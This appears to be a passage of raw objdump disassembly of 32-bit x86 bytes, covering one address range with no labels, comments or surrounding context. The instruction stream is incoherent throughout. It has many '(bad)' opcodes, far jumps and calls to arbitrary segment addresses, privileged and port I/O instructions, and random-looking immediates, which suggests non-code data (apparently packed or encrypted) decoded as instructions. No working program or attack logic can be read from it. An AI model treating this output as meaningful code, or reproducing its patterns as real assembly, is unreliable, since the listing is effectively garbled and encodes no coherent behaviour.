  44c135:	jae    0x44c177
  44c137:	sbb    al,BYTE PTR [edx]
  44c139:	aas    
  44c13a:	add    eax,ebx
  44c13c:	popa   
  44c13d:	lahf   
  44c13e:	inc    eax
  44c13f:	stos   DWORD PTR es:[edi],eax
  44c140:	(bad)  
  44c141:	sub    BYTE PTR [eax+0xe],cl
  44c144:	retf   
  44c145:	rcr    BYTE PTR [ebx],0xd6
  44c148:	inc    edi
  44c149:	inc    edx
  44c14a:	in     eax,dx
  44c14b:	es aam 0x13
  44c14e:	pop    eax
  44c14f:	sbb    BYTE PTR [eax-0x4a],cl
  44c152:	es cli 
  44c154:	add    eax,0x406c0a32
  44c159:	mov    al,0xa
  44c15b:	sub    cl,BYTE PTR [eax+0x6e]
  44c15e:	pop    edi
  44c15f:	and    dl,bl
  44c161:	inc    ebx
  44c162:	add    DWORD PTR [esp+ebp*1],esp
  44c165:	or     dl,bh
  44c167:	(bad)  
  44c168:	mov    ds:0x4c58ed48,eax
  44c16d:	mov    edx,0x91e0bcac
  44c172:	mov    al,ds:0xdea69a69
  44c177:	and    BYTE PTR [ecx-0x27fe6fe8],bl
  44c17d:	(bad)  
  44c17f:	pusha  
  44c180:	cmp    BYTE PTR [eax+0x4da23f62],ah
  44c186:	iret   
  44c187:	sbb    BYTE PTR [esi+0x0],0xb7
  44c18b:	rcr    BYTE PTR [eax],cl
  44c18d:	shl    BYTE PTR [eax+0x6caf6ac5],1
  44c193:	ins    DWORD PTR es:[edi],dx
  44c194:	mov    BYTE PTR [ebx+0x58],dl
  44c197:	push   cs
  44c198:	mov    bh,0xdd
  44c19a:	xchg   esp,eax
  44c19b:	mov    ds:0xd81ea28f,eax
  44c1a0:	dec    edx
  44c1a1:	ss stos BYTE PTR es:[edi],al
  44c1a3:	clc    
  44c1a4:	xchg   ebx,eax
  44c1a5:	push   ds
  44c1a6:	add    eax,0xacae0354
  44c1ab:	dec    edx
  44c1ac:	cwde   
  44c1ad:	jmp    0x6264:0xae040c80
  44c1b4:	(bad)  
  44c1b6:	lock add bh,BYTE PTR [esi]
  44c1b9:	jmp    edi
  44c1bb:	cmp    al,0x49
  44c1bd:	add    ecx,DWORD PTR [ecx+0x3f]
  44c1c0:	test   eax,0xe9c4debd
  44c1c5:	data16 add BYTE PTR [esi+0x52],bh
  44c1c9:	les    edi,FWORD PTR [ebx+edx*1]
  44c1cc:	lock out 0x6b,al
  44c1cf:	mov    ds:0x50474855,al
  44c1d4:	jmp    0x7416:0x803a1904
  44c1db:	or     esp,DWORD PTR [edi]
  44c1dd:	pop    esi
  44c1de:	lods   al,BYTE PTR ds:[esi]
  44c1df:	cwde   
  44c1e0:	push   es
  44c1e1:	loope  0x44c192
  44c1e3:	xor    al,BYTE PTR [edx]
  44c1e5:	outs   dx,BYTE PTR ds:[esi]
  44c1e6:	ret    0x1e1c
  44c1e9:	pop    esp
  44c1ea:	jne    0x44c231
  44c1ec:	mov    eax,ds:0x9bf84aed
  44c1f1:	call   0x403e:0x96df3c44
  44c1f8:	pop    eax
  44c1f9:	inc    edx
  44c1fa:	(bad)  
  44c1fb:	mov    dh,0xca
  44c1fd:	mov    ?,WORD PTR [ebx-0x789278a0]
  44c203:	cwde   
  44c204:	test   al,0x1c
  44c206:	mov    edx,0xb9d84cc6
  44c20b:	xor    al,0x5d
  44c20d:	push   eax
  44c20e:	cli    
  44c20f:	and    DWORD PTR [edx-0x3d],edi
  44c212:	pop    eax
  44c213:	(bad)  
  44c214:	cmp    ah,bh
  44c216:	mov    dh,0xb5
  44c218:	push   ebp
  44c219:	pushf  
  44c21a:	repnz mov al,ds:0xc18ccab9
  44c220:	aam    0xdd
  44c222:	test   BYTE PTR [esi],cl
  44c224:	sub    eax,0x430614de
  44c229:	or     BYTE PTR [ecx-0x48edb482],bh
  44c22f:	jae    0x44c211
  44c231:	add    al,0x62
  44c233:	imul   edx,DWORD PTR [esi+0x3e],0x4
  44c237:	adc    BYTE PTR [edx+0x32b8ca1f],al
  44c23d:	push   ss
  44c23e:	pop    esi
  44c23f:	sbb    BYTE PTR [edx+0xc],bh
  44c242:	out    dx,al
  44c243:	cmp    bh,BYTE PTR [esi-0x28]
  44c246:	inc    edx
  44c247:	call   0x34547001
  44c24c:	jecxz  0x44c292
  44c24e:	xor    BYTE PTR [ebp-0x5efcbe6a],cl
  44c254:	sub    esi,DWORD PTR [esi-0x36]
  44c257:	bound  ecx,QWORD PTR [edx-0x7bc6e558]
  44c25d:	push   es
  44c25e:	adc    dh,BYTE PTR [esi-0x12]
  44c261:	sbb    ch,BYTE PTR [eax]
  44c263:	imul   eax,DWORD PTR [ebp+0x2b],0x67703bf8
  44c26a:	loop   0x44c2e5
  44c26c:	push   esi
  44c26d:	add    bl,BYTE PTR [eax-0x30]
  44c270:	jno    0x44c254
  44c272:	ins    DWORD PTR es:[edi],dx
  44c273:	dec    eax
  44c274:	push   ecx
  44c275:	jle    0x44c272
  44c277:	xchg   BYTE PTR [eax+edx*4-0x4107a24c],bh
  44c27e:	and    bl,BYTE PTR [ecx]
  44c280:	push   cs
  44c281:	mov    bh,cl
  44c283:	mov    esp,0x6562209e
  44c288:	enter  0x1468,0x2
  44c28c:	cmc    
  44c28d:	push   ebx
  44c28e:	push   es
  44c28f:	xchg   esp,eax
  44c290:	pop    ebp
  44c291:	es mov al,0xae
  44c294:	add    eax,0xa5df047d
  44c299:	jp     0x44c2bd
  44c29b:	aam    0x80
  44c29d:	imul   edx,DWORD PTR [ebp+0x6e],0x306034b3
  44c2a4:	lods   eax,DWORD PTR ds:[esi]
  44c2a5:	dec    edi
  44c2a6:	adc    ebx,DWORD PTR [ebx]
  44c2a8:	mov    dh,0x2a
  44c2aa:	lods   al,BYTE PTR ds:[esi]
  44c2ab:	mov    WORD PTR [esi-0x3f4a7fc6],gs
  44c2b1:	push   es
  44c2b2:	test   BYTE PTR [edx-0x7f494f88],dh
  44c2b8:	call   0xf8b0df5d
  44c2bd:	sub    dl,bl
  44c2bf:	and    esi,DWORD PTR [ebp+0x7686d07d]
  44c2c5:	and    DWORD PTR [edx],edi
  44c2c7:	mov    al,0x1
  44c2c9:	jo     0x44c2b6
  44c2cb:	push   esi
  44c2cc:	in     eax,0x36
  44c2ce:	mov    dh,BYTE PTR [eax+0x6a725c5a]
  44c2d4:	sbb    al,0xa2
  44c2d6:	pop    esi
  44c2d7:	add    al,al
  44c2d9:	call   0x3edb84f6
  44c2de:	gs test al,0x6d
  44c2e1:	pop    es
  44c2e2:	fidivr DWORD PTR [ecx-0x3c]
  44c2e5:	pop    ss
  44c2e6:	inc    eax
  44c2e7:	jbe    0x44c2aa
  44c2e9:	mov    dh,0xb
  44c2eb:	cmp    al,0x94
  44c2ee:	push   edi
  44c2ef:	sti    
  44c2f0:	jle    0x44c2c6
  44c2f2:	push   edx
  44c2f3:	sti    
  44c2f4:	push   edx
  44c2f5:	mov    ebp,ebp
  44c2f7:	pop    eax
  44c2f8:	add    BYTE PTR [edi+edx*4+0xa],ch
  44c2fc:	sub    ebx,esp
  44c2fe:	or     al,0xa1
  44c300:	call   0x70a56128
  44c305:	push   cs
  44c306:	pop    ebx
  44c307:	retf   0x4648
  44c30a:	jnp    0x44c34a
  44c30c:	and    eax,0x11927ce5
  44c311:	push   ebp
  44c312:	or     eax,0x3c50414b
  44c317:	cli    
  44c318:	test   eax,0x3e96b88b
  44c31d:	cmp    DWORD PTR [eax-0x7d0bf59],esi
  44c323:	dec    esp
  44c324:	lods   al,BYTE PTR ds:[esi]
  44c325:	lea    ecx,[ecx]
  44c327:	int3   
  44c328:	pop    edx
  44c329:	add    BYTE PTR [ebx+0x15],bl
  44c32c:	sub    BYTE PTR [edi],dl
  44c32e:	mov    WORD PTR [ebx],fs
  44c330:	out    dx,al
  44c331:	lea    ebx,[eax+0x334299ed]
  44c337:	stos   BYTE PTR es:[edi],al
  44c338:	xchg   esi,eax
  44c339:	push   esi
  44c33a:	aam    0xc4
  44c33c:	sub    BYTE PTR [edx],al
  44c33e:	cmp    al,0xb6
  44c340:	test   BYTE PTR [ebx+0x6e],cl
  44c343:	into   
  44c344:	dec    esi
  44c345:	cs dec eax
  44c347:	mov    esp,0x642d81a4
  44c34c:	mov    al,ds:0xc441aba0
  44c351:	and    eax,0xf93e94ce
  44c356:	xchg   edx,edi
  44c358:	or     al,0xa9
  44c35a:	cwde   
  44c35b:	adc    BYTE PTR [eax+0x4e],bh
  44c35e:	sbb    ah,al
  44c360:	mov    cl,0x51
  44c362:	(bad)  
  44c364:	ins    DWORD PTR es:[edi],dx
  44c365:	jbe    0x44c2f2
  44c367:	enter  0xe1e8,0xf9
  44c36b:	mov    BYTE PTR [esi-0x5d],al
  44c36e:	sbb    eax,0x2582343a
  44c373:	jp     0x44c380
  44c375:	lea    eax,[ecx-0x4]
  44c378:	and    BYTE PTR [edx-0x5c],dh
  44c37b:	fisub  DWORD PTR [esi+0x2dbb6b0d]
  44c381:	push   edx
  44c382:	xor    DWORD PTR ss:[edx+0x22],edx
  44c386:	cmp    dh,ch
  44c388:	mov    BYTE PTR [esi],ah
  44c38a:	call   0x3503:0x17ce6834
  44c391:	and    eax,0x1a54843c
  44c396:	out    0xd6,al
  44c398:	rcr    BYTE PTR [edx],0x2
  44c39b:	in     eax,dx
  44c39c:	inc    ebx
  44c39d:	push   cs
  44c39e:	out    dx,al
  44c39f:	fadd   QWORD PTR [esi]
  44c3a1:	jnp    0x44c343
  44c3a3:	mov    cl,0xa8
  44c3a5:	xor    BYTE PTR [eax+0xbb2614],0x11
  44c3ac:	(bad)  
  44c3ad:	js     0x44c3ef
  44c3af:	or     BYTE PTR [ebp+0x49],ch
  44c3b2:	into   
  44c3b3:	push   0x63
  44c3b5:	fs fwait
  44c3b7:	(bad)  
  44c3b8:	or     DWORD PTR ds:0xf15c1bed,edx
  44c3be:	jbe    0x44c43a
  44c3c0:	les    eax,FWORD PTR [esi-0x566cab6b]
  44c3c6:	cmp    BYTE PTR [edx+eiz*8-0x12],bl
  44c3ca:	arpl   WORD PTR [esi],bp
  44c3cc:	pop    ss
  44c3cd:	dec    eax
  44c3ce:	cli    
  44c3cf:	dec    esp
  44c3d0:	adc    dl,BYTE PTR [esi-0x707ea767]
  44c3d6:	mov    dh,0x7e
  44c3d8:	jmp    0xf493:0x69b08ca2
  44c3df:	or     edx,esp
  44c3e1:	aaa    
  44c3e2:	out    dx,al
  44c3e3:	leave  
  44c3e4:	nop
  44c3e5:	ret    0x6237
  44c3e8:	jmp    0xb1e59cbe
  44c3ed:	xchg   BYTE PTR [edx+0x7158c6bd],dl
  44c3f3:	popa   
  44c3f4:	mov    ah,0x94
  44c3f6:	push   edx
  44c3f7:	psadbw mm0,mm5
  44c3fa:	dec    esp
  44c3fb:	mov    gs,WORD PTR [edx-0x76]
  44c3fe:	or     al,0x3c
  44c400:	mov    bh,ah
  44c402:	jb     0x44c424
  44c404:	jle    0x44c40f
  44c406:	add    eax,0x83061087
  44c40b:	sub    ch,BYTE PTR [edx]
  44c40d:	push   ecx
  44c40e:	inc    ebp
  44c40f:	or     eax,0x77144442
  44c414:	sub    al,0x9
  44c416:	jmp    0x9898e8be
  44c41b:	ins    DWORD PTR es:[edi],dx
  44c41c:	out    dx,al
  44c41d:	sub    al,0x40
  44c41f:	sbb    bl,BYTE PTR [ecx-0xe89b03e]
  44c425:	xchg   edx,eax
  44c426:	mov    ch,0xca
  44c428:	xor    dl,cl
  44c42a:	retf   
  44c42b:	and    al,0x1b
  44c42d:	inc    esp
  44c42e:	mov    al,ds:0x3c3d2c3e
  44c433:	jmp    0x44c3ea
  44c435:	rcl    BYTE PTR [eax],1
  44c437:	adc    eax,DWORD PTR [eax-0x7165997a]
  44c43d:	into   
  44c43e:	xor    dl,BYTE PTR [edx-0x397e1ed8]
  44c444:	or     cl,dl
  44c446:	sbb    eax,0x2c4724a1
  44c44b:	mov    dl,0xd6
  44c44d:	dec    eax
  44c44e:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  44c450:	push   ss
  44c451:	fsub   DWORD PTR [esi-0x7b334486]
  44c457:	fs mov edi,0xf1db6a4d
  44c45d:	add    al,0x4a
  44c45f:	loop   0x44c4b9
  44c461:	call   0x9d0f6322
  44c466:	sbb    ch,BYTE PTR ds:0x1488a47c
  44c46c:	mov    edx,fs
  44c46e:	ss daa 
  44c470:	push   eax
  44c471:	fmul   DWORD PTR [esi]
  44c473:	inc    edx
  44c474:	mov    ch,0x6a
  44c476:	loope  0x44c4b5
  44c478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c479:	and    al,dl
  44c47b:	mov    WORD PTR [edx-0x3fa30f19],gs
  44c481:	cld    
  44c482:	add    DWORD PTR [edi],edi
  44c484:	inc    eax
  44c485:	cmp    al,0x76
  44c487:	(bad)  
  44c488:	jg     0x44c4be
  44c48a:	dec    ebp
  44c48b:	call   0x2a5c:0x6f0801e0
  44c492:	or     BYTE PTR [esi+0x3],0x4a
  44c496:	inc    eax
  44c497:	adc    BYTE PTR [ecx+0x19],cl
  44c49a:	push   0xdd96a4b8
  44c49f:	mov    al,0xf7
  44c4a1:	add    ebp,DWORD PTR [edi-0x22cd8a94]
  44c4a7:	cwde   
  44c4a8:	out    dx,eax
  44c4a9:	xchg   ecx,eax
  44c4aa:	xchg   BYTE PTR [esi-0x2e],bl
  44c4ad:	dec    edi
  44c4ae:	cli    
  44c4af:	or     eax,0x490ea496
  44c4b4:	sub    al,0xa8
  44c4b6:	jp     0x44c509
  44c4b8:	dec    eax
  44c4b9:	mov    cl,0xa8
  44c4bb:	inc    edx
  44c4bc:	mov    bh,0x7e
  44c4be:	enter  0xa140,0x28
  44c4c2:	adc    eax,0x50ef7e60
  44c4c7:	mov    bl,0x57
  44c4c9:	test   BYTE PTR [esi+0x7c585388],dl
  44c4cf:	repz push eax
  44c4d1:	pop    eax
  44c4d2:	rcl    BYTE PTR [eax+ebx*2+0xa],1
  44c4d6:	ss mov cx,0x8cc0
  44c4db:	dec    edx
  44c4dc:	stos   BYTE PTR es:[edi],al
  44c4dd:	jge    0x44c4f7
  44c4df:	mov    ds:0x636a7d70,eax
  44c4e4:	ins    BYTE PTR es:[edi],dx
  44c4e5:	mov    ds:0x7338043d,al
  44c4ea:	jmp    0x7107:0x4135c194
  44c4f1:	and    BYTE PTR [eax+0x30],0xec
  44c4f5:	pushf  
  44c4f6:	call   0xd5f70036
  44c4fb:	push   0x9de25ad0
  44c500:	pop    esi
  44c501:	sub    eax,0x1f4081a9
  44c506:	ss jo  0x44c51e
  44c509:	lahf   
  44c50a:	push   edx
  44c50b:	jnp    0x44c547
  44c50d:	xchg   esp,eax
  44c50e:	int3   
  44c50f:	retf   0xa0f1
  44c512:	sbb    ecx,DWORD PTR [ecx+ebx*4+0x68]
  44c516:	loope  0x44c545
  44c518:	ins    BYTE PTR es:[edi],dx
  44c519:	(bad)  
  44c51a:	pop    ds
  44c51b:	sbb    al,0x5e
  44c51d:	inc    edx
  44c51e:	add    BYTE PTR [esi+0x22a13656],dh
  44c524:	daa    
  44c525:	pop    eax
  44c526:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c527:	retf   
  44c528:	lods   eax,DWORD PTR ds:[esi]
  44c529:	push   0x22
  44c52b:	jmp    0x1d2b6e88
  44c530:	test   esp,edi
  44c532:	pop    ss
  44c533:	xor    eax,0x70449055
  44c538:	add    ch,BYTE PTR [edx+esi*4-0x4a]
  44c53c:	mov    cl,0xcb
  44c53e:	les    ecx,FWORD PTR [ecx+0x46]
  44c541:	lock fidivr DWORD PTR ds:0x963c60f8
  44c548:	and    dl,ch
  44c54a:	lock push ss
  44c54c:	add    DWORD PTR [ebx+ebp*4+0x380aed19],esi
  44c553:	shr    BYTE PTR [esi],0x47
  44c556:	test   al,0xbd
  44c558:	xchg   esp,edx
  44c55a:	mov    cs,WORD PTR [ebx]
  44c55c:	inc    esp
  44c55d:	lock scas al,BYTE PTR es:[edi]
  44c55f:	mov    dl,dh
  44c561:	js     0x44c500
  44c563:	shl    DWORD PTR [ecx],0x1
  44c566:	ins    BYTE PTR es:[edi],dx
  44c567:	retf   0x1e64
  44c56a:	mov    esp,0x4a890c5c
  44c56f:	retf   0xc57c
  44c572:	out    dx,eax
  44c573:	add    BYTE PTR [edi+0x17],dl
  44c576:	cs ret 0xda43
  44c57a:	cmp    eax,0xbd70dc82
  44c57f:	dec    ebp
  44c580:	xor    edx,DWORD PTR [eax+ebp*8]
  44c583:	xchg   ebx,eax
  44c584:	add    BYTE PTR [esi-0x5c],bl
  44c587:	aas    
  44c588:	jp     0x44c596
  44c58a:	mov    DWORD PTR [edx+0x52],ebp
  44c58d:	adc    DWORD PTR ds:0x985ea09c,0xfffffff6
  44c594:	les    edi,FWORD PTR [edi+0x1f158403]
  44c59a:	add    BYTE PTR [edx-0x4dcf8aba],al
  44c5a0:	mov    dl,0x1e
  44c5a2:	inc    ebx
  44c5a3:	fcmovnb st,st(0)
  44c5a5:	sub    BYTE PTR [ebp+edi*4-0x72],0x95
  44c5aa:	repz fwait
  44c5ac:	jp     0x44c55b
  44c5ae:	fistp  QWORD PTR [esi+0x496494b6]
  44c5b4:	jbe    0x44c58c
  44c5b6:	mov    esi,0x23ba1eca
  44c5bb:	fwait
  44c5bc:	mov    al,ds:0xb1b7d2
  44c5c1:	test   al,ah
  44c5c3:	cmp    ch,BYTE PTR [eax]
  44c5c5:	sub    BYTE PTR [edi],ch
  44c5c7:	jmp    0x56e3676f
  44c5cc:	imul   edx,eax,0x26
  44c5cf:	mov    dh,0x2
  44c5d1:	mov    cl,0x88
  44c5d3:	scas   eax,DWORD PTR es:[edi]
  44c5d4:	cmp    al,0x8a
  44c5d6:	ficom  WORD PTR [esi]
  44c5d8:	push   esp
  44c5d9:	inc    ecx
  44c5da:	mov    ch,0x4b
  44c5dc:	add    DWORD PTR [eax],edi
  44c5de:	nop
  44c5df:	adc    bl,BYTE PTR [esi+ebx*4-0x17]
  44c5e3:	and    BYTE PTR [eax+edi*1],ch
  44c5e6:	test   al,al
  44c5e8:	or     al,0xa8
  44c5ea:	xchg   edx,eax
  44c5eb:	pop    eax
  44c5ec:	es fs nop
  44c5ef:	scas   al,BYTE PTR es:[edi]
  44c5f0:	cmp    BYTE PTR ds:0xd76c2c44,dl
  44c5f6:	push   0xa6ce9eec
  44c5fb:	push   edx
  44c5fc:	adc    BYTE PTR es:[eax],0x28
  44c600:	mov    ah,0xf1
  44c602:	dec    esi
  44c603:	and    edi,DWORD PTR [edx]
  44c605:	aas    
  44c606:	mov    al,0x20
  44c608:	fimul  DWORD PTR [edi]
  44c60a:	and    BYTE PTR [ebp-0x1d43c52e],al
  44c610:	lea    esi,[edx]
  44c612:	or     cl,BYTE PTR [esp+ecx*2-0x78]
  44c616:	rol    BYTE PTR [ecx],cl
  44c618:	repnz and al,0x6
  44c61b:	mov    cl,0x7d
  44c61d:	push   edx
  44c61e:	xchg   esi,eax
  44c61f:	pop    ebp
  44c620:	or     cl,dh
  44c622:	mov    WORD PTR [esi],fs
  44c624:	adc    BYTE PTR ds:0x181026c7,bl
  44c62a:	xchg   DWORD PTR [edx+ecx*4+0x7805b523],edi
  44c631:	xchg   esi,eax
  44c632:	cmp    al,0xb8
  44c634:	xor    ebp,DWORD PTR [esi+0x50]
  44c637:	mov    eax,0x8ea5b915
  44c63c:	out    0xf0,al
  44c63e:	ins    BYTE PTR es:[edi],dx
  44c63f:	mov    ds:0x5a1c8aa,al
  44c644:	pop    ebp
  44c645:	mov    dh,0x28
  44c647:	jbe    0x44c650
  44c649:	retf   0xc10e
  44c64c:	lock push esp
  44c64e:	mov    esi,0x13d610a3
  44c653:	inc    eax
  44c654:	cmp    al,BYTE PTR [edx-0xd]
  44c657:	in     eax,dx
  44c658:	fnstcw WORD PTR [eax+0x65]
  44c65b:	in     al,0x2
  44c65d:	out    0xc4,eax
  44c65f:	xor    eax,0x476d5b16
  44c664:	mov    bl,0x8a
  44c666:	test   eax,0x52be6470
  44c66b:	push   ss
  44c66c:	mov    ds:0x9c46b315,al
  44c671:	jbe    0x44c61b
  44c673:	test   DWORD PTR [esi-0x1e],esp
  44c676:	cs xor bl,dl
  44c679:	jb     0x44c6c0
  44c67b:	or     al,0x48
  44c67d:	ins    BYTE PTR es:[edi],dx
  44c67e:	(bad)  
  44c67f:	and    dl,ah
  44c681:	das    
  44c682:	cs jl  0x44c689
  44c685:	aam    0xb
  44c687:	jmp    0xde48:0xe81bd2a1
  44c68e:	loopne 0x44c661
  44c690:	inc    esp
  44c691:	loope  0x44c6db
  44c693:	inc    eax
  44c694:	xchg   esp,eax
  44c695:	mov    esi,0xbb436186
  44c69a:	push   es
  44c69b:	push   esi
  44c69c:	leave  
  44c69d:	sbb    al,0x73
  44c69f:	out    0x8,al
  44c6a1:	imul   ebx,DWORD PTR [edx-0x5],0x6d
  44c6a5:	mov    eax,ds:0x559e5986
  44c6aa:	mov    ebp,0xa85823d6
  44c6af:	or     dl,BYTE PTR [edx-0x31]
  44c6b2:	mov    dl,0x48
  44c6b4:	pop    edi
  44c6b5:	xchg   edx,eax
  44c6b6:	push   ss
  44c6b7:	dec    esp
  44c6b8:	shl    DWORD PTR [ecx+ebx*1+0x17ceb60a],cl
  44c6bf:	mov    ch,0x6b
  44c6c1:	or     DWORD PTR [eax],ebp
  44c6c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c6c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c6c5:	nop
  44c6c6:	xor    BYTE PTR [esi+eax*4],0x89
  44c6ca:	fild   WORD PTR [edx]
  44c6cc:	mov    al,0xfa
  44c6ce:	xchg   DWORD PTR [ebx+0x42],eax
  44c6d1:	mov    ah,BYTE PTR [edx]
  44c6d3:	cli    
  44c6d4:	inc    ebp
  44c6d5:	loope  0x44c6e8
  44c6d7:	jl     0x44c66f
  44c6d9:	aam    0x32
  44c6db:	sub    cl,BYTE PTR [eax-0x241e9330]
  44c6e1:	mov    gs,WORD PTR [esi+0x4c]
  44c6e4:	ret    
  44c6e5:	fs aas 
  44c6e7:	and    al,0x6d
  44c6e9:	popf   
  44c6ea:	pushf  
  44c6eb:	xor    eax,esi
  44c6ed:	pop    ss
  44c6ee:	dec    ebp
  44c6ef:	dec    esp
  44c6f0:	das    
  44c6f1:	inc    ebx
  44c6f2:	call   0x508e219b
  44c6f7:	push   edx
  44c6f8:	daa    
  44c6f9:	sub    DWORD PTR [esi+0x68bee03b],0x8095c040
  44c703:	push   edi
  44c704:	sbb    BYTE PTR [ebp+0x4dba9812],dl
  44c70a:	jge    0x44c717
  44c70c:	dec    ebp
  44c70d:	fsubr  DWORD PTR [esi+0x109fd6a]
  44c713:	je     0x44c6bd
  44c715:	hlt    
  44c716:	push   ds
  44c717:	push   0x7c
  44c719:	push   0x921616cf
  44c71e:	ja     0x7d31246
  44c724:	jne    0x44c739
  44c726:	adc    dl,BYTE PTR [edx+0x3a714e78]
  44c72c:	lea    esi,[esi+0x21]
  44c72f:	and    cl,BYTE PTR [edi+0x6f12a6fa]
  44c735:	mov    DWORD PTR [ebx-0x16],0xbf844a27
  44c73c:	test   al,0x79
  44c73e:	mov    al,ds:0x9f112f9c
  44c743:	mov    BYTE PTR [eax-0xb],bl
  44c746:	call   0xd4f94407
  44c74b:	mov    dh,0x31
  44c74d:	jl     0x44c775
  44c74f:	inc    edi
  44c750:	mov    esi,0xb0d0165e
  44c755:	jp     0x44c72f
  44c757:	cli    
  44c758:	and    DWORD PTR [edi+ebx*4-0x2f],edi
  44c75c:	(bad)  
  44c75e:	xchg   ecx,eax
  44c75f:	clc    
  44c760:	lods   eax,DWORD PTR ds:[esi]
  44c761:	sub    eax,0xaee5bd6b
  44c766:	xor    eax,0x8d910adb
  44c76b:	or     esp,DWORD PTR [eax-0x5a]
  44c76e:	jp     0x44c72e
  44c770:	test   eax,0xd7d45be1
  44c775:	gs mov esp,0x37dc4a11
  44c77b:	lea    eax,ds:0x99e42a0e
  44c781:	inc    eax
  44c782:	hlt    
  44c783:	adc    edi,DWORD PTR [edi-0x2b361e98]
  44c789:	cld    
  44c78a:	jg     0x44c75c
  44c78c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c78d:	mov    al,0xc2
  44c78f:	pop    eax
  44c790:	cli    
  44c791:	jle    0x44c795
  44c793:	jmpw   0x494c
  44c797:	clts   
  44c799:	out    dx,eax
  44c79a:	lods   al,BYTE PTR ds:[esi]
  44c79b:	pop    esi
  44c79c:	or     DWORD PTR [ebx-0x5a],ebx
  44c79f:	test   BYTE PTR [ebp+0x44],dh
  44c7a2:	(bad)  
  44c7a3:	fldcw  WORD PTR [esi+esi*2-0x492fdb04]
  44c7aa:	and    DWORD PTR [esi],ebp
  44c7ac:	and    DWORD PTR [edx],esp
  44c7ae:	mov    eax,0xf674fe70
  44c7b3:	push   ebx
  44c7b4:	les    esi,FWORD PTR [ebx+0x4df8fc24]
  44c7ba:	test   al,0x91
  44c7bc:	sub    BYTE PTR [eax],0x76
  44c7bf:	push   ss
  44c7c0:	(bad)  
  44c7c1:	or     BYTE PTR [esi+0x63],0x70
  44c7c5:	fdivrp st(7),st
  44c7c7:	lock sahf 
  44c7c9:	scas   eax,DWORD PTR es:[edi]
  44c7ca:	clc    
  44c7cb:	and    eax,0x12305f6d
  44c7d0:	jo     0x44c789
  44c7d2:	adc    edx,esp
  44c7d4:	scas   eax,DWORD PTR es:[edi]
  44c7d5:	neg    bl
  44c7d7:	xor    DWORD PTR [esi+0x2],edi
  44c7da:	sub    BYTE PTR [ebp+0xae3e278],dl
  44c7e0:	das    
  44c7e1:	je     0x44c76c
  44c7e3:	or     BYTE PTR [edi],0x1
  44c7e6:	outs   dx,BYTE PTR ds:[esi]
  44c7e7:	mov    bh,0x8e
  44c7e9:	xchg   bh,cl
  44c7eb:	es ss loop 0x44c80a
  44c7ef:	popa   
  44c7f0:	test   BYTE PTR [edi],bh
  44c7f2:	push   ebp
  44c7f3:	or     BYTE PTR [eax],dl
  44c7f5:	in     eax,dx
  44c7f6:	mov    ch,0xa8
  44c7f8:	sar    DWORD PTR [edx+eax*2],cl
  44c7fb:	mov    al,ds:0x9b4dae16
  44c800:	scas   al,BYTE PTR es:[edi]
  44c801:	arpl   WORD PTR [ebx*2+0x4011815c],bx
  44c808:	add    al,0xda
  44c80a:	test   BYTE PTR [edx],ch
  44c80c:	or     esi,esp
  44c80e:	add    BYTE PTR [esi],bl
  44c810:	bound  ebx,QWORD PTR [ebx+ebp*1]
  44c813:	add    ebp,DWORD PTR [ebx-0x356bf2b3]
  44c819:	or     DWORD PTR [ebp+0xb],esi
  44c81c:	inc    esi
  44c81d:	shr    DWORD PTR [edi],cl
  44c81f:	xchg   BYTE PTR ds:0xd92466c,dl
  44c825:	(bad)  
  44c827:	hlt    
  44c828:	mov    dh,0x7f
  44c82a:	rol    edx,1
  44c82c:	repnz into 
  44c82e:	jno    0x44c7bc
  44c830:	jbe    0x44c857
  44c832:	ins    DWORD PTR es:[edi],dx
  44c833:	mov    bl,bl
  44c835:	fdivr  DWORD PTR [eax+ecx*1]
  44c838:	mov    BYTE PTR [eax-0x5cfd39c0],cl
  44c83e:	push   cs
  44c83f:	add    bh,bl
  44c841:	int3   
  44c842:	add    BYTE PTR [esi+0x604ae066],0x52
  44c849:	jle    0x44c8b3
  44c84b:	fnstcw WORD PTR [edi+0x76a5e021]
  44c851:	add    al,0x26
  44c853:	jmp    0x6493:0x5d1b2ff
  44c85a:	mov    BYTE PTR [eax-0x28],bl
  44c85d:	adc    eax,0x261fa917
  44c862:	ins    BYTE PTR es:[edi],dx
  44c863:	inc    esp
  44c864:	in     eax,dx
  44c865:	mov    dl,ah
  44c867:	push   esp
  44c868:	inc    ebx
  44c869:	ret    
  44c86a:	sub    BYTE PTR [ebx+ebp*2+0x56],dh
  44c86e:	loopne 0x44c848
  44c870:	sbb    ebp,DWORD PTR [ebx]
  44c872:	xchg   esp,eax
  44c873:	adc    BYTE PTR [edx-0xadbb32a],dh
  44c879:	push   eax
  44c87a:	ror    BYTE PTR [edi-0x12],0x22
  44c87e:	sbb    esi,DWORD PTR [ecx+esi*4+0x4bad120]
  44c885:	lods   al,BYTE PTR ds:[esi]
  44c886:	push   edx
  44c887:	pop    eax
  44c888:	inc    edx
  44c889:	call   0xf015:0x441a5e7b
  44c890:	clc    
  44c891:	inc    esi
  44c892:	(bad)  
  44c893:	sub    al,0xd
  44c895:	xlat   BYTE PTR ds:[ebx]
  44c896:	xchg   edx,eax
  44c897:	or     bl,BYTE PTR [eax]
  44c899:	dec    ebp
  44c89a:	add    al,0x2b
  44c89c:	mov    esp,0x181029dd
  44c8a1:	mov    dl,0x67
  44c8a3:	retf   0x9056
  44c8a6:	mov    bl,0xdf
  44c8a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c8a9:	shl    BYTE PTR [eax+0x974b72c],1
  44c8af:	shl    BYTE PTR [esi-0x56077e9d],1
  44c8b5:	stc    
  44c8b6:	(bad)  
  44c8b7:	out    dx,eax
  44c8b8:	hlt    
  44c8b9:	mov    gs,WORD PTR [ebp+0x69c44be1]
  44c8bf:	push   esp
  44c8c0:	into   
  44c8c1:	push   ss
  44c8c2:	push   esi
  44c8c3:	jmp    0x8daf:0x3638576
  44c8ca:	into   
  44c8cb:	test   al,0x11
  44c8cd:	xchg   BYTE PTR [eax-0x2fe0ecf0],ch
  44c8d3:	mov    dl,0xce
  44c8d5:	cs mov bh,0x4e
  44c8d8:	sbb    ch,BYTE PTR [esp+esi*4]
  44c8db:	test   BYTE PTR [esi+eax*2],0xa5
  44c8df:	lods   al,BYTE PTR ds:[esi]
